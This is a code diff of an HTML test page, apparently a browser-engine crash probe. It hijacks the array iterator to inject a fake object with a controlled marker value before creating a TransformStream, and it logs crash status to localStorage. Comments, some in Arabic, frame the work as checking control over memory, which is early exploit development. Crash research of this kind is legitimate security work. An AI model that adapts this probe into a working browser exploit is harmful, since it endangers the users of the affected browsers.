@@ -3,11 +3,7 @@
 <body>
 <div id="status">Running...</div>
 <script>
-// 1. مسح أي بيانات سابقة
 localStorage.removeItem('crash_result');
-
-// 2. تسجيل أننا بدأنا
-localStorage.setItem('crash_result', 'STARTED');
 
 let buf = new ArrayBuffer(8);
 let view = new DataView(buf);
@@ -22,10 +18,10 @@ try {
                     return { done: true };
                 let val = arr[i];
                 
-                // تسجيل حالة المكرر قبل المرور للكائن الخاطئ
                 if (arr.length === 3 && i >= 1) {
                     localStorage.setItem('crash_result', 'ABOUT_TO_CRASH_AT_INDEX_' + i);
-                    val = { fake: true, pad: 0x41414141 };
+                    // غيّر القيمة هنا للتحقق من التحكم
+                    val = { fake: true, pad: 0x13371337 };
                 }
                 i++;
                 return { value: val, done: false };
@@ -33,30 +29,12 @@ try {
         };
     };
 
-    // 3. تسجيل أننا على وشك استدعاء TransformStream
-    localStorage.setItem('crash_result', 'BEFORE_TRANSFORMSTREAM');
-    
     let stream = new TransformStream();
-    
-    // 4. إذا وصلنا هنا، يعني لم يكرش!
     localStorage.setItem('crash_result', 'NO_CRASH_SUCCESS');
     
-    // محاولة قراءة buf
-    let hex = "";
-    for (let j = 0; j < 8; j++) {
-        hex += view.getUint8(j).toString(16) + " ";
-    }
-    localStorage.setItem('crash_data', hex);
-    
-    document.getElementById("status").textContent = "SUCCESS! Check localStorage.";
-    
 } catch(e) {
-    // 5. إذا تم التقاط الخطأ (TypeError) بدل الـ Crash
-    localStorage.setItem('crash_result', 'CAUGHT_EXCEPTION: ' + e.message);
-    document.getElementById("status").textContent = "Caught: " + e.message;
+    localStorage.setItem('crash_result', 'CAUGHT: ' + e.message);
 }
-
-// استعادة المكرر
 Array.prototype[Symbol.iterator] = [][Symbol.iterator];
 </script>
 </body>
